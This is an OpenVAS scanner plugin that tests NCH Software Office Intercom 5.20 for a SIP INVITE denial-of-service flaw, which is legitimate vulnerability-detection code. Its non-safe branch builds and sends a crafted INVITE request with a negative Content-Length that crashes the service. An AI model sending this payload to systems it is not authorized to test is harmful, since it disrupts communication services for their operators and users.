###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nch_office_intercom_45049.nasl 10974 2018-08-15 09:55:34Z cfischer $
#
# NCH Software Office Intercom SIP Invite Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100918");
  script_version("$Revision: 10974 $");
  script_tag(name:"last_modification", value:"$Date: 2018-08-15 11:55:34 +0200 (Wed, 15 Aug 2018) $");
  script_tag(name:"creation_date", value:"2010-11-26 13:31:06 +0100 (Fri, 26 Nov 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_bugtraq_id(45049);
  script_name("NCH Software Office Intercom SIP Invite Remote Denial of Service Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("sip_detection.nasl", "find_service.nasl");
  script_mandatory_keys("sip/detected");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/45049");
  script_xref(name:"URL", value:"http://www.nch.com.au/oi/");

  script_tag(name:"summary", value:"NCH Software Office Intercom is prone to a remote denial-of-service
  vulnerability because it fails to properly handle specially crafted SIP INVITE requests.");

  script_tag(name:"impact", value:"Exploiting this issue allows remote attackers to cause a denial-of-
  service due to a NULL-pointer dereference. Due to the nature of this issue, remote code execution
  may be possible but this has not been confirmed.");

  script_tag(name:"affected", value:"Office Intercom 5.20 is vulnerable. Other versions may also be affected.");

  script_tag(name:"qod_type", value:"remote_banner");

  exit(0);
}

include("version_func.inc");
include("sip.inc");
include("misc_func.inc");

infos = get_sip_port_proto( default_port:"5060", default_proto:"udp" );
port = infos['port'];
proto = infos['proto'];

banner = get_sip_banner( port:port, proto:proto );
if( ! banner || "NCH Software Office Intercom" >!< banner ) exit( 0 );

if( safe_checks() ) {

  version = eregmatch( pattern:"NCH Software Office Intercom ([0-9.]+)", string:banner );
  if( isnull( version[1] ) ) exit( 0 );

  if( version_is_less_equal( version:version[1], test_version:"5.20" ) ) {
    security_message( port:port, proto:proto );
    exit( 0 );
  }

  exit( 99 );

} else {

  if( ! sip_alive( port:port, proto:proto ) ) exit( 0 );

  from_default = get_vt_string();
  from_lower   = get_vt_string( lowercase:TRUE );

  req = string(
    "INVITE sip:", from_lower, "@", get_host_name(), " SIP/2.0","\r\n",
    "Via: SIP/2.0/", toupper( proto ), " ", this_host(), ":", port, ";branch=z9hG4bKJRnTggvMGl-6233","\r\n",
    "From: ", from_default, " <sip:", from_lower, "@", this_host(),">;tag=f7mXZqgqZy-6233","\r\n",
    "To: ", from_default, " <sip:", from_lower, "@", get_host_name(), ":", port, ">","\r\n",
    "Call-ID: ", rand(), "\r\n",
    "CSeq: 1 INVITE\r\n",
    "Max-Forwards: 70\r\n",
    "Content-Type: application/sdp\r\n",
    "Content-Length: -1");
  sip_send_recv( port:port, data:req, proto:proto );

  if( ! sip_alive( port:port, proto:proto ) ) {
    security_message( port:port, proto:proto );
    exit( 0 );
  }
  exit( 99 );
}

exit( 0 );
